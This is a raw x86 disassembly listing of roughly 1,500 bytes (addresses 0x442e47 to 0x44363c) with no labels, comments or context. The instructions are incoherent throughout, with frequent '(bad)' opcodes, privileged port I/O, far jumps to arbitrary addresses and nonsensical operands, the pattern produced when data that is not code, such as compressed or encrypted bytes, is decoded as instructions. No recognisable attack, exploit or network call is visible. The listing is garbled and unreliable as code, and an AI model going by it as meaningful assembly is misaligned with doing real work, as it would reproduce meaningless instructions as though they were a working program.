  442e47:	adc    BYTE PTR [ecx+0x69e9116e],cl
  442e4d:	fld    QWORD PTR ds:0x8a013bef
  442e53:	add    eax,0x89094e8b
  442e58:	pushf  
  442e59:	jle    0x442de8
  442e5b:	out    dx,eax
  442e5c:	(bad)  
  442e5d:	jl     0x442ebf
  442e5f:	test   BYTE PTR [ebp-0x10fb05],cl
  442e65:	retf   0x3d5e
  442e68:	hlt    
  442e69:	push   eax
  442e6a:	dec    esi
  442e6b:	jae    0x442e7b
  442e6d:	and    BYTE PTR [esp+ebp*8-0x76185975],0x7d
  442e75:	and    eax,DWORD PTR [eax]
  442e77:	dec    BYTE PTR cs:[esi+eax*1+0x60ab758b]
  442e7f:	xor    eax,0xfd38f4
  442e84:	mov    DWORD PTR [esi],eax
  442e86:	cld    
  442e87:	inc    BYTE PTR [edi-0x813049e]
  442e8d:	lods   eax,DWORD PTR ds:[esi]
  442e8e:	jbe    0x442e20
  442e90:	jge    0x442ebc
  442e92:	shr    ebp,cl
  442e94:	test   DWORD PTR [eax],0x7775e9
  442e9a:	xchg   ebp,eax
  442e9b:	add    ch,ah
  442e9d:	mov    DWORD PTR [edi],esi
  442e9f:	dec    BYTE PTR [ecx-0x267975c3]
  442ea5:	mov    edi,DWORD PTR [edx+0x28]
  442ea8:	cld    
  442ea9:	cmc    
  442eaa:	jne    0x442ece
  442eac:	mov    bh,dh
  442eae:	pop    ss
  442eaf:	ja     0x442e90
  442eb1:	xor    DWORD PTR [esi+0x5],0x50
  442eb5:	xor    edi,DWORD PTR [ecx]
  442eb7:	jecxz  0x442ef2
  442eb9:	sti    
  442eba:	gs jl  0x442e7a
  442ebd:	add    BYTE PTR [edx+0x0],ah
  442ec0:	cmp    dl,BYTE PTR [ebp+0x72]
  442ec3:	add    esi,DWORD PTR [ebp-0x43]
  442ec6:	bound  eax,QWORD PTR [eax]
  442ec8:	add    esi,DWORD PTR [ebx]
  442eca:	and    ch,BYTE PTR [edx]
  442ecc:	dec    esi
  442ecd:	sbb    dl,bl
  442ecf:	sti    
  442ed0:	sti    
  442ed1:	mov    WORD PTR [edx],fs
  442ed3:	sar    DWORD PTR [ebx],0x3d
  442ed6:	jb     0x442edb
  442ed8:	jmp    edi
  442eda:	mov    DWORD PTR [esp+ebp*8-0x15e18709],eax
  442ee1:	mov    al,0x62
  442ee3:	add    BYTE PTR [ebx],al
  442ee5:	mov    esp,DWORD PTR [edi-0xb3f7ffc]
  442eeb:	jg     0x442ee8
  442eed:	and    bl,BYTE PTR [ebp+0x73]
  442ef0:	cdq    
  442ef1:	add    BYTE PTR [edx+0x0],ah
  442ef4:	mov    BYTE PTR [ebp+0x6a],cl
  442ef7:	xchg   DWORD PTR [esi],esi
  442ef9:	add    al,0x0
  442efb:	jmp    0x442f62
  442efd:	out    dx,eax
  442efe:	mov    edx,ebp
  442f00:	or     DWORD PTR [esi+0x18],ecx
  442f03:	dec    esi
  442f04:	fsqrt  
  442f06:	in     al,dx
  442f07:	cwde   
  442f08:	out    0x2a,al
  442f0a:	mov    ebp,0x6c5cbdb5
  442f0f:	arpl   WORD PTR [edx],dx
  442f11:	pushf  
  442f12:	mul    DWORD PTR [ebx-0x27]
  442f15:	jmp    0x7075bc1d
  442f1a:	outs   dx,BYTE PTR ds:[esi]
  442f1b:	jp     0x442f7d
  442f1d:	mov    WORD PTR [edi],es
  442f1f:	xchg   ebp,eax
  442f20:	test   ch,dl
  442f22:	hlt    
  442f23:	mul    esp
  442f25:	cmp    DWORD PTR [esi-0x76],edx
  442f28:	mov    eax,0x606203dc
  442f2d:	sub    al,0xec
  442f2f:	fldcw  WORD PTR [edi]
  442f31:	(bad)  
  442f32:	aam    0xd9
  442f34:	push   ss
  442f35:	push   0xffffffed
  442f37:	imul   eax,DWORD PTR [ebx-0x5ddc7c24],0xffffffc2
  442f3e:	pop    es
  442f3f:	loop   0x442f58
  442f41:	stc    
  442f42:	jnp    0x442fa0
  442f44:	pop    esi
  442f45:	sub    al,0xf0
  442f47:	jl     0x442ee1
  442f49:	jo     0x442f8c
  442f4b:	cs push esp
  442f4d:	test   eax,0xbb552e7b
  442f52:	jp     0x442fae
  442f54:	into   
  442f55:	sub    al,0x14
  442f57:	nop
  442f58:	adc    esi,DWORD PTR [edx+0x41]
  442f5b:	push   cs
  442f5c:	into   
  442f5d:	sbb    al,0x14
  442f5f:	add    BYTE PTR [eax+0x620b9fe6],dl
  442f65:	add    DWORD PTR [ebx-0x11],ecx
  442f68:	cmc    
  442f69:	or     ebx,edx
  442f6b:	and    eax,0x7ee1609b
  442f70:	repz lds esi,FWORD PTR [edx]
  442f73:	fild   WORD PTR [ebx+edx*1-0x19]
  442f77:	add    esp,DWORD PTR [esi+ebx*2]
  442f7a:	pushf  
  442f7b:	or     ebp,eax
  442f7d:	call   0x61a49282
  442f82:	push   cs
  442f83:	lahf   
  442f84:	dec    ecx
  442f85:	loope  0x442fc7
  442f87:	jo     0x442fb4
  442f89:	icebp  
  442f8a:	cmp    esp,DWORD PTR [edi]
  442f8c:	sub    al,0xf5
  442f8e:	xor    ch,BYTE PTR [ecx]
  442f90:	(bad)  
  442f91:	out    dx,eax
  442f92:	call   0xf745e4ee
  442f97:	xchg   ebx,eax
  442f98:	jnp    0x442f3d
  442f9a:	mov    DWORD PTR [ecx-0x65ac59d4],edi
  442fa0:	xor    al,0x1
  442fa2:	xchg   esp,eax
  442fa3:	repnz nop
  442fa5:	add    DWORD PTR [ebx-0x41a1aa53],eax
  442fab:	aas    
  442fac:	and    eax,0x61fdc220
  442fb1:	pop    esi
  442fb2:	div    DWORD PTR [eiz*8-0x2d8db10c]
  442fb9:	jmp    0x77951928
  442fbe:	sbb    BYTE PTR [esi+0x34f7d5ca],dh
  442fc4:	add    BYTE PTR [edx+0x10],ah
  442fc7:	ins    DWORD PTR es:[edi],dx
  442fc8:	icebp  
  442fc9:	sbb    ebp,edi
  442fcb:	cmc    
  442fcc:	sahf   
  442fcd:	xor    BYTE PTR [ecx+0x1dedaa55],dh
  442fd3:	les    edi,FWORD PTR [edx]
  442fd5:	mov    BYTE PTR [eax-0x16b5e275],bl
  442fdb:	mov    esp,DWORD PTR ds:0x258bd54a
  442fe1:	cmp    ah,cl
  442fe3:	dec    ebp
  442fe4:	sbb    ebp,DWORD PTR [esi-0x6a2eae56]
  442fea:	jmp    0xe92d:0x107de93c
  442ff1:	popa   
  442ff2:	fld    DWORD PTR [eax]
  442ff4:	mov    BYTE PTR [ebp-0x34ffc387],bl
  442ffa:	iret   
  442ffb:	mov    ah,0x89
  442ffd:	inc    eax
  442fff:	or     BYTE PTR [edx+eax*2-0x4f],ah
  443003:	add    BYTE PTR [eax],al
  443005:	mov    ebx,0xaf448bdc
  44300a:	int3   
  44300b:	mov    ebx,DWORD PTR [eax-0x4d]
  44300e:	xchg   DWORD PTR [esp],edi
  443011:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443012:	iret   
  443013:	sbb    DWORD PTR [ebx-0x17df735],ecx
  443019:	gs nop
  44301b:	cmp    ecx,DWORD PTR [ebx-0x7cdb3f11]
  443021:	xchg   ecx,eax
  443022:	or     DWORD PTR [esp+eax*1-0x30],esp
  443026:	push   cs
  443027:	data16 cs add dh,dh
  44302b:	shl    BYTE PTR [esi-0x73],0x37
  44302f:	dec    esi
  443030:	adc    BYTE PTR [ebx+0xc488380],cl
  443036:	clc    
  443037:	jne    0x44302d
  443039:	call   FWORD PTR [esi+0x4a016819]
  44303f:	fadd   QWORD PTR [eax]
  443041:	mov    edi,DWORD PTR [eax+0x5]
  443044:	fild   QWORD PTR [edx-0x46ff23c1]
  44304a:	dec    edx
  44304b:	fadd   QWORD PTR [eax]
  44304d:	add    BYTE PTR [eax-0x6817f762],dh
  443053:	rol    DWORD PTR [eax],1
  443055:	add    al,ah
  443057:	dec    esp
  443058:	push   esp
  443059:	(bad)  
  44305a:	push   cs
  44305b:	fadd   QWORD PTR [eax]
  44305d:	add    BYTE PTR [ebx],cl
  44305f:	pop    ebp
  443060:	mov    ah,0x18
  443062:	je     0x44300f
  443064:	pop    ebx
  443065:	ret    
  443066:	sbb    BYTE PTR [ecx-0x6363fbec],0xf4
  44306d:	add    eax,0xb800dc0b
  443072:	(bad)  
  443074:	add    al,BYTE PTR [eax]
  443076:	bound  ebp,QWORD PTR [esi]
  443078:	sub    al,0x8b
  44307a:	es (bad) 
  44307c:	hlt    
  44307d:	mov    ch,BYTE PTR [edx]
  44307f:	or     ch,BYTE PTR [eax+ecx*8]
  443082:	mov    edx,0xc5f7e6ed
  443087:	ins    BYTE PTR es:[edi],dx
  443088:	je     0x4430f2
  44308a:	pop    edx
  44308b:	mov    edi,0xb500046c
  443090:	popa   
  443091:	adc    esi,edi
  443093:	xor    al,BYTE PTR [esi]
  443095:	(bad)  [esi]
  443097:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443098:	(bad)  
  443099:	icebp  
  44309a:	and    DWORD PTR [esi+0x1e8b460d],0x1e
  4430a1:	sti    
  4430a2:	mov    dh,BYTE PTR [esi]
  4430a4:	push   ss
  4430a5:	adc    ecx,DWORD PTR [ecx-0x235a0]
  4430ab:	(bad)  
  4430ad:	mov    ebx,0x28b5e94d
  4430b2:	or     cl,bl
  4430b4:	fdiv   st,st(1)
  4430b6:	jno    0x4430fe
  4430b8:	pop    ss
  4430b9:	jb     0x4430d3
  4430bb:	pop    ebp
  4430bc:	ret    0xe814
  4430bf:	outs   dx,DWORD PTR ds:[esi]
  4430c0:	inc    edi
  4430c1:	lock mul ecx
  4430c4:	xor    al,0xf7
  4430c6:	push   esp
  4430c7:	and    ch,bh
  4430c9:	add    cl,BYTE PTR [ebp-0x6c]
  4430cc:	(bad)  
  4430cd:	dec    ebp
  4430ce:	mov    ecx,DWORD PTR [eax+0x24]
  4430d1:	ret    
  4430d2:	xor    ecx,DWORD PTR [ecx]
  4430d4:	and    al,0xcd
  4430d6:	xor    ebp,DWORD PTR [esp]
  4430d9:	lock div DWORD PTR [ebx]
  4430dc:	mov    esp,0x33b75651
  4430e1:	je     0x4430cd
  4430e3:	fld    DWORD PTR [ecx-0xe873e8c]
  4430e9:	(bad)  
  4430eb:	popa   
  4430ec:	fldl2t 
  4430ee:	add    esi,DWORD PTR [ecx]
  4430f0:	sbb    DWORD PTR [edx],ebx
  4430f2:	int    0x0
  4430f4:	xor    DWORD PTR [eax],edx
  4430f6:	sbb    dl,dh
  4430f8:	xor    DWORD PTR [esi],eax
  4430fa:	inc    esi
  4430fb:	jmp    0x5491832f
  443100:	and    al,0xae
  443102:	rol    DWORD PTR [ebx],cl
  443104:	cmp    cl,bl
  443106:	shr    esp,0x73
  443109:	popf   
  44310a:	jmp    0xe492fb61
  44310f:	add    esp,DWORD PTR [edx-0x5a]
  443112:	mov    bh,0x4c
  443114:	pop    ss
  443115:	sbb    dh,BYTE PTR [esp+edi*2+0x55e1bd3e]
  44311c:	xor    eax,DWORD PTR [esi]
  44311e:	jne    0x443147
  443120:	data16 icebp 
  443122:	sub    al,0xf1
  443124:	xchg   ebp,eax
  443125:	push   es
  443126:	push   0xffffffc7
  443128:	pop    esi
  443129:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44312a:	sub    edi,ebx
  44312c:	jge    0x443140
  44312e:	lods   eax,DWORD PTR ds:[esi]
  44312f:	rcr    BYTE PTR [esi-0x593f5aeb],0x15
  443136:	(bad)  
  443137:	out    dx,eax
  443138:	pop    ss
  443139:	push   edx
  44313a:	mov    ch,0x83
  44313c:	inc    esi
  44313d:	loope  0x4431b1
  44313f:	dec    ecx
  443140:	push   0xffffffaa
  443142:	jb     0x443195
  443144:	pop    esi
  443145:	scas   eax,DWORD PTR es:[edi]
  443146:	bound  esi,QWORD PTR [ebx+0x5a]
  443149:	retf   0x56f9
  44314c:	jmp    0x2d8dd92f
  443151:	fstp   DWORD PTR [esi-0x1627c1b7]
  443157:	add    eax,DWORD PTR [eax]
  443159:	bound  edx,QWORD PTR [edx+edx*1+0x14]
  44315d:	loope  0x44315f
  44315f:	jg     0x4431d9
  443161:	imul   edx,DWORD PTR [edx+0x27],0x166108
  443168:	mov    edx,0x14f7ce05
  44316d:	bound  edx,QWORD PTR [edx+0x46]
  443170:	cmc    
  443171:	js     0x44310a
  443173:	or     dl,ch
  443175:	lods   al,BYTE PTR ds:[esi]
  443176:	leave  
  443177:	add    al,0x13
  443179:	cmc    
  44317a:	xchg   ebx,eax
  44317b:	add    al,0x62
  44317d:	sub    ebp,ecx
  44317f:	out    dx,al
  443180:	test   eax,0x6407a75d
  443185:	jo     0x44315f
  443187:	add    cl,ch
  443189:	loop   0x443126
  44318b:	call   0x8b51aaf0
  443190:	ret    0x50b5
  443193:	cmp    eax,0x18c42911
  443198:	pusha  
  443199:	sbb    edi,ebp
  44319b:	adc    BYTE PTR [edx],0x8c
  44319e:	je     0x443200
  4431a0:	adc    bl,BYTE PTR [esp+ebx*2-0x65]
  4431a4:	jmp    0x64450b0a
  4431a9:	push   0xffffffa2
  4431ab:	mov    ebx,DWORD PTR [ebp+0x2d85d4d7]
  4431b1:	int3   
  4431b2:	call   0x51ba5640
  4431b7:	add    BYTE PTR [eax+0x1a],ah
  4431ba:	add    DWORD PTR [ebp-0x60],edi
  4431bd:	add    ch,dl
  4431bf:	aad    0x8b
  4431c1:	sahf   
  4431c2:	cmp    edx,edx
  4431c4:	idiv   DWORD PTR [esi-0x49c2bbc4]
  4431ca:	pop    esi
  4431cb:	xchg   al,al
  4431cd:	sub    eax,0x72438c72
  4431d2:	stos   BYTE PTR es:[edi],al
  4431d3:	add    DWORD PTR [ebx-0x9fe1f3f],ecx
  4431d9:	sbb    al,0xe4
  4431db:	pop    ecx
  4431dc:	jne    0x44316c
  4431de:	popa   
  4431df:	jne    0x443201
  4431e1:	add    BYTE PTR [eax-0x72077c22],dl
  4431e7:	mov    WORD PTR [ebx],cs
  4431e9:	mov    edi,DWORD PTR ds:0xb8cf03d1
  4431ef:	add    al,0x2f
  4431f1:	push   DWORD PTR [esi-0xb175fc]
  4431f7:	jg     0x44323f
  4431f9:	or     al,bh
  4431fb:	inc    ebx
  4431fc:	xor    ecx,DWORD PTR [ecx+esi*2]
  4431ff:	hlt    
  443200:	inc    esp
  443201:	or     al,0x50
  443203:	xchg   ecx,eax
  443204:	in     al,0x5f
  443206:	in     eax,dx
  443207:	(bad)  
  443208:	mov    esp,ebp
  44320a:	out    dx,al
  44320b:	pop    ss
  44320c:	mov    bh,0x45
  44320e:	ja     0x4431e8
  443210:	add    BYTE PTR [eax],al
  443212:	retf   
  443213:	pop    ds
  443214:	mov    ebp,0x81e9068b
  443219:	cmp    al,bl
  44321b:	xchg   DWORD PTR [ebp-0x20],ebx
  44321e:	mul    ch
  443220:	cmp    DWORD PTR ds:0x345cd700,0x0
  443227:	jnp    0x4431b5
  443229:	and    BYTE PTR [eax-0x39],ch
  44322c:	pop    esp
  44322d:	xor    al,0x0
  44322f:	arpl   WORD PTR [edi+0x3],bp
  443232:	add    BYTE PTR [ebx+0x604b459],cl
  443238:	sbb    eax,0xc4000f64
  44323d:	adc    BYTE PTR [edx+0x4a],ch
  443240:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443241:	out    dx,eax
  443242:	adc    eax,0x345c57
  443247:	mov    eax,0x7e8b0811
  44324c:	loope  0x443236
  44324e:	scas   eax,DWORD PTR es:[edi]
  44324f:	or     eax,0x868beef6
  443254:	loope  0x44328f
  443256:	pop    eax
  443257:	aas    
  443258:	mov    WORD PTR [ecx],ss
  44325a:	mov    esp,DWORD PTR [edx-0x3b]
  44325d:	hlt    
  44325e:	push   ecx
  44325f:	mov    ch,0x77
  443261:	ror    DWORD PTR [ebx-0x94e95d6],1
  443267:	or     eax,0x6e3d7983
  44326c:	ja     0x4432a5
  44326e:	clc    
  44326f:	jmp    0x44322a
  443271:	add    BYTE PTR [ebx-0x91b90a4],cl
  443277:	jbe    0x443280
  443279:	js     0x4432c1
  44327b:	pop    esi
  44327c:	out    dx,eax
  44327d:	mov    bl,0x33
  44327f:	outs   dx,BYTE PTR ds:[esi]
  443280:	jmp    0x436:0x87664de5
  443287:	add    cl,bl
  443289:	imul   edi,ebx,0x2
  44328c:	xchg   ebp,eax
  44328d:	(bad)  
  44328e:	idiv   BYTE PTR [ecx]
  443290:	mov    ebp,0x1f8af76c
  443295:	loop   0x443310
  443297:	dec    eax
  443298:	pop    edx
  443299:	xchg   ebp,ecx
  44329b:	call   0xf82a1eb8
  4432a0:	fcom   st(3)
  4432a2:	in     eax,0xf7
  4432a4:	xchg   ebp,eax
  4432a5:	sbb    BYTE PTR [eax+0x4],dl
  4432a8:	pop    ebp
  4432a9:	jle    0x4432f8
  4432ab:	test   DWORD PTR [ebp+0x6a45780a],0xa98b4c61
  4432b5:	sub    DWORD PTR [eax-0xa],esp
  4432b8:	ins    DWORD PTR es:[edi],dx
  4432b9:	and    bl,dl
  4432bb:	push   ds
  4432bc:	gs sub ah,ah
  4432bf:	test   DWORD PTR [edi+0x62400e9c],0x74701e1b
  4432c9:	mov    al,0xfc
  4432cb:	ret    
  4432cc:	push   ss
  4432cd:	in     al,0x4e
  4432cf:	push   ebx
  4432d0:	jno    0x443305
  4432d2:	js     0x443310
  4432d4:	jle    0x4432af
  4432d6:	cmc    
  4432d7:	clc    
  4432d8:	in     eax,dx
  4432d9:	test   ch,ch
  4432db:	inc    esp
  4432dc:	fldcw  WORD PTR [ebp+0x220d13c5]
  4432e2:	mov    cs,ecx
  4432e4:	loope  0x443307
  4432e6:	jmp    0xce018165
  4432eb:	jp     0x4432ed
  4432ed:	xchg   esi,eax
  4432ee:	mov    ebp,0xbd3e78d9
  4432f3:	(bad)  
  4432f6:	test   ch,dh
  4432f8:	inc    esp
  4432f9:	fldcw  WORD PTR [ebp+0x21f50bfd]
  4432ff:	push   esi
  443300:	leave  
  443301:	loope  0x443324
  443303:	jmp    0xde01c982
  443308:	jp     0x443328
  44330a:	mov    ebp,0x8d05f8e1
  44330f:	sar    DWORD PTR [eax+0x26],1
  443312:	mov    ebp,0xbd7678d1
  443317:	cmc    
  443318:	xor    BYTE PTR [eax-0x7587e7f6],dl
  44331e:	dec    esi
  44331f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443320:	daa    
  443321:	jb     0x44332d
  443323:	sbb    BYTE PTR [eax-0x4f],bh
  443326:	out    dx,al
  443327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  443328:	js     0x4432d4
  44332a:	dec    esi
  44332b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44332c:	daa    
  44332d:	push   0x4e
  44332f:	xchg   ebp,eax
  443330:	daa    
  443331:	outs   dx,BYTE PTR ds:[esi]
  443332:	dec    esi
  443333:	popf   
  443334:	daa    
  443335:	push   edx
  443336:	sub    dl,dl
  443338:	aad    0x8b
  44333a:	sub    bl,dl
  44333c:	aad    0x8a
  44333e:	into   
  44333f:	mov    dl,0x71
  443341:	dec    esi
  443342:	or     bl,al
  443344:	jg     0x443398
  443346:	or     al,BYTE PTR [ebp+0x20]
  443349:	jbe    0x443399
  44334b:	mov    cl,0x7f
  44334d:	xchg   BYTE PTR [ebp+0x3000d100],bh
  443353:	and    eax,DWORD PTR [ebx]
  443355:	cwde   
  443356:	lods   al,BYTE PTR ds:[esi]
  443357:	fstp   TBYTE PTR [ebx]
  443359:	cmp    eax,0xf16fd582
  44335e:	scas   eax,DWORD PTR es:[edi]
  44335f:	add    bh,BYTE PTR [edx]
  443361:	sub    eax,0xe86ee942
  443366:	pop    ebx
  443367:	(bad)  
  443368:	shl    BYTE PTR [edx+0x20],cl
  44336b:	call   0x91ef:0x1f10e66d
  443372:	in     eax,0x1e
  443374:	add    BYTE PTR [edx],dl
  443376:	test   al,0xaa
  443378:	ret    0x61f9
  44337b:	dec    esi
  44337c:	div    DWORD PTR [esp+eiz*2+0x7e4580fd]
  443383:	(bad)  
  443384:	add    cl,ch
  443386:	cld    
  443387:	test   al,0x5f
  443389:	lods   eax,DWORD PTR ds:[esi]
  44338a:	popa   
  44338b:	push   eax
  44338c:	add    eax,0xc540ad
  443391:	pusha  
  443392:	push   ebx
  443393:	xchg   ecx,eax
  443394:	pop    edi
  443395:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  443396:	popa   
  443397:	push   eax
  443398:	adc    eax,0xc540ad
  44339d:	jo     0x443412
  44339f:	cdq    
  4433a0:	pop    edi
  4433a1:	lods   eax,DWORD PTR ds:[esi]
  4433a2:	popa   
  4433a3:	push   eax
  4433a4:	xor    eax,0xc500cd
  4433a9:	(bad)  
  4433aa:	adc    eax,0x458668d4
  4433af:	fstp   DWORD PTR [esi+0x65]
  4433b2:	jnp    0x443359
  4433b4:	pop    edi
  4433b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4433b6:	add    BYTE PTR [ecx-0x5d],ah
  4433b9:	test   BYTE PTR [esi+edi*1],al
  4433bc:	mov    ds:0x5d03e93c,al
  4433c1:	std    
  4433c2:	sbb    al,0xc1
  4433c4:	mov    ebp,0xdeda4700
  4433c9:	xor    BYTE PTR [eax],al
  4433cb:	pushf  
  4433cc:	cdq    
  4433cd:	add    BYTE PTR [esi-0x49],ah
  4433d0:	loope  0x4433ee
  4433d2:	addr16 (bad) 
  4433d4:	aad    0x8c
  4433d6:	(bad)  
  4433d7:	ds jge 0x443431
  4433da:	inc    esp
  4433db:	cmp    eax,DWORD PTR [eax-0x6f67ffcb]
  4433e1:	push   edi
  4433e2:	inc    esp
  4433e3:	or     eax,DWORD PTR [eax-0x6b57fbcb]
  4433e9:	push   edi
  4433ea:	inc    esp
  4433eb:	sti    
  4433ec:	xor    DWORD PTR ds:0x57a09808,0x75800b44
  4433f6:	loopne 0x44337f
  4433f8:	repz out dx,al
  4433fa:	(bad)  
  4433fb:	(bad)  
  4433fc:	cmp    al,0x56
  4433fe:	inc    esp
  4433ff:	sti    
  443400:	aad    0x0
  443402:	add    ebx,ecx
  443404:	xor    eax,0xdcff6758
  443409:	mov    ds:0xc09d5c,eax
  44340e:	(bad)  
  44340f:	mov    esi,0xcb4456ac
  443414:	std    
  443415:	cli    
  443416:	dec    DWORD PTR [ebx+0x53f51b]
  44341c:	ffree  st(0)
  44341e:	add    BYTE PTR [ecx],al
  443420:	mov    ebx,0xcfa100dc
  443425:	jl     0x44345b
  443427:	add    BYTE PTR [edx],al
  443429:	pop    ecx
  44342a:	fdivr  st,st(4)
  44342c:	repz mov al,fs:0xc0db48
  443433:	mov    DWORD PTR [esi],ecx
  443435:	sbb    ah,ch
  443437:	inc    DWORD PTR [ebp+ebx*4-0x2b910100]
  44343e:	adc    al,BYTE PTR [eax+0x7b]
  443441:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443442:	xor    al,0x4e
  443444:	bound  esi,QWORD PTR [edx-0x11900904]
  44344a:	or     al,0x40
  44344c:	bound  ebp,QWORD PTR [edx+0x3245fbfb]
  443452:	jmp    0x43655264
  443457:	add    BYTE PTR [edx+0x5388072f],dl
  44345d:	mov    dl,0xfc
  44345f:	enter  0x2e21,0xb8
  443463:	les    ebp,FWORD PTR [esi]
  443465:	shl    BYTE PTR [ebp+0x3c],0x3e
  443469:	push   es
  44346a:	hlt    
  44346b:	mov    edi,0x44742a97
  443470:	and    dh,BYTE PTR ds:[esp+edi*1+0x46]
  443475:	imul   BYTE PTR [ebx]
  443477:	shr    ch,cl
  443479:	xor    BYTE PTR [ebp-0x28],0xd9
  44347d:	sub    eax,0xed000817
  443482:	mov    al,ds:0xb2e9f075
  443487:	icebp  
  443488:	pop    esp
  443489:	jle    0x44348d
  44348b:	je     0x443455
  44348d:	fldcw  WORD PTR [edi+0x227e5cf1]
  443493:	cld    
  443494:	ror    cl,1
  443496:	cs je  0x443461
  443499:	jmp    0xd9544beb
  44349e:	cmp    eax,0x35d90417
  4434a3:	pop    ss
  4434a4:	or     BYTE PTR [ebx-0x4c242c28],dh
  4434aa:	fcmovnbe st,st(3)
  4434ac:	fcomp  DWORD PTR [ecx-0x37]
  4434af:	addr16 in al,dx
  4434b1:	lea    eax,[edx]
  4434b3:	je     0x4434a5
  4434b5:	jne    0x443504
  4434b7:	pop    ss
  4434b8:	or     al,0xe9
  4434ba:	mov    ecx,0xd9463c75
  4434bf:	stc    
  4434c0:	lock test bl,bl
  4434c3:	mov    eax,0x35c26475
  4434c8:	and    BYTE PTR [esi-0x7a],bl
  4434cb:	loope  0x443542
  4434cd:	gs ret 0x2025
  4434d1:	pop    edx
  4434d2:	xchg   eax,esi
  4434d4:	cmp    DWORD PTR [ecx+0x59140595],ecx
  4434da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4434db:	std    
  4434dc:	(bad)  
  4434de:	and    dl,dl
  4434e0:	aas    
  4434e1:	inc    esi
  4434e2:	rol    DWORD PTR [edx],1
  4434e4:	push   eax
  4434e5:	add    BYTE PTR [esi-0x33],bh
  4434e8:	xchg   esi,eax
  4434e9:	int    0x5
  4434eb:	and    ch,BYTE PTR [edx-0x33]
  4434ee:	bound  edx,QWORD PTR [edx-0x4d]
  4434f1:	jl     0x443524
  4434f3:	push   ebx
  4434f4:	mov    al,ds:0xa7532a7c
  4434f9:	dec    ecx
  4434fa:	and    dl,ch
  4434fc:	jmp    0xba525bb8
  443501:	push   edx
  443502:	test   eax,0x623fc9a9
  443507:	repnz loope 0x44355e
  44350a:	xor    eax,DWORD PTR [edx-0x47]
  44350d:	arpl   WORD PTR [esi+0x663772d9],cx
  443513:	int    0x70
  443515:	cmp    al,0x6a
  443517:	push   eax
  443518:	stos   BYTE PTR es:[edi],al
  443519:	(bad)  
  44351a:	jmp    0xc1a9:0x134ed572
  443521:	dec    edx
  443522:	push   fs
  443524:	ret    0x9ec5
  443527:	dec    BYTE PTR ds:0x150da1d3
  44352d:	mov    bh,0xa6
  44352f:	or     eax,0xd9eb72d
  443534:	and    eax,0xda6b7
  443539:	bound  ecx,QWORD PTR [edx-0x16027474]
  44353f:	xchg   ebx,eax
  443540:	or     BYTE PTR [ecx-0x16ff5cd5],ah
  443546:	mov    edi,0x5d01c0
  44354b:	(bad)  
  44354c:	retf   0x2cc0
  44354f:	and    DWORD PTR [edx+0x41],edx
  443552:	add    eax,0x1811861
  443557:	xchg   esi,eax
  443558:	mov    esp,0xf6b2e900
  44355d:	xor    bl,BYTE PTR [ebx-0x16fe2e01]
  443563:	popa   
  443564:	lahf   
  443565:	cmp    DWORD PTR [ecx],esi
  443567:	outs   dx,BYTE PTR ds:[esi]
  443568:	(bad)  
  443569:	mov    WORD PTR [ebx-0x55aae467],gs
  44356f:	retf   0xc414
  443572:	mov    ch,0xca
  443574:	adc    al,0xc4
  443576:	lods   eax,DWORD PTR ds:[esi]
  443577:	mov    edx,0xfd62c414
  44357c:	mov    ecx,DWORD PTR [ebx+0x8bc697d]
  443582:	jb     0x4435aa
  443584:	lds    eax,FWORD PTR [ebx]
  443586:	xor    ebp,edx
  443588:	cs inc ecx
  44358a:	std    
  44358b:	xor    BYTE PTR [edi-0xa869f9],cl
  443591:	xor    DWORD PTR [ebx],ebx
  443593:	adc    eax,0x69f13c54
  443598:	jl     0x443588
  44359a:	mov    edi,0xdd755268
  44359f:	sub    BYTE PTR [ecx-0x75491dfc],dl
  4435a5:	or     DWORD PTR [edx+0x2e],esi
  4435a8:	rol    DWORD PTR [ebx],1
  4435aa:	xor    BYTE PTR [ecx+0x2],cl
  4435ad:	jb     0x443592
  4435af:	add    BYTE PTR [ebx],ah
  4435b1:	pop    edx
  4435b2:	rol    BYTE PTR [eax],0xb3
  4435b5:	mov    dl,0xc6
  4435b7:	jb     0x44360c
  4435b9:	retf   0x5fc0
  4435bc:	int    0x92
  4435be:	dec    ebp
  4435bf:	ret    
  4435c0:	loope  0x4435c3
  4435c2:	pop    edi
  4435c3:	mov    eax,0xe8009963
  4435c8:	xlat   BYTE PTR ds:[ebx]
  4435c9:	fadd   DWORD PTR [eax]
  4435cb:	add    al,cl
  4435cd:	jns    0x4435bb
  4435cf:	add    ch,bl
  4435d1:	fadd   DWORD PTR [eax]
  4435d3:	inc    eax
  4435d4:	cmp    ecx,DWORD PTR [edi-0xc039e18]
  4435da:	out    dx,al
  4435db:	pop    ecx
  4435dc:	(bad)  
  4435dd:	sbb    BYTE PTR [ebp+edi*1-0x40],ah
  4435e1:	cdq    
  4435e2:	or     BYTE PTR [ebx],ch
  4435e4:	cmc    
  4435e5:	test   al,0x46
  4435e7:	call   0x332987
  4435ec:	push   edx
  4435ed:	mov    ?,WORD PTR [ebp-0x40]
  4435f0:	ja     0x4435d2
  4435f2:	mov    eax,DWORD PTR [eax+0x17]
  4435f5:	push   ss
  4435f6:	call   0x836caa1a
  4435fb:	loopne 0x443607
  4435fd:	cmp    al,0x35
  4435ff:	cld    
  443600:	jge    0x4435f5
  443602:	out    dx,al
  443603:	call   DWORD PTR [eax+0x2f458bb8]
  443609:	jg     0x44360b
  44360b:	mov    ecx,ebx
  44360d:	(bad)  
  44360e:	leave  
  44360f:	cmp    eax,0xc000d8c6
  443614:	add    ah,cl
  443616:	dec    esp
  443617:	ror    DWORD PTR [ebx+0x658b178a],0x23
  44361e:	cmp    esi,DWORD PTR ds:0xeef37dfc
  443624:	dec    DWORD PTR [eax-0x748517e8]
  44362a:	fadd   DWORD PTR [eax]
  44362c:	ret    
  44362d:	bound  esi,QWORD PTR [edi+0x37]
  443630:	sbb    al,0x5a
  443632:	ja     0x443663
  443634:	sbb    al,0x72
  443636:	pop    es
  443637:	mov    ebx,0xef162e8b
  44363c:	ins    BYTE PTR es:[edi],dx
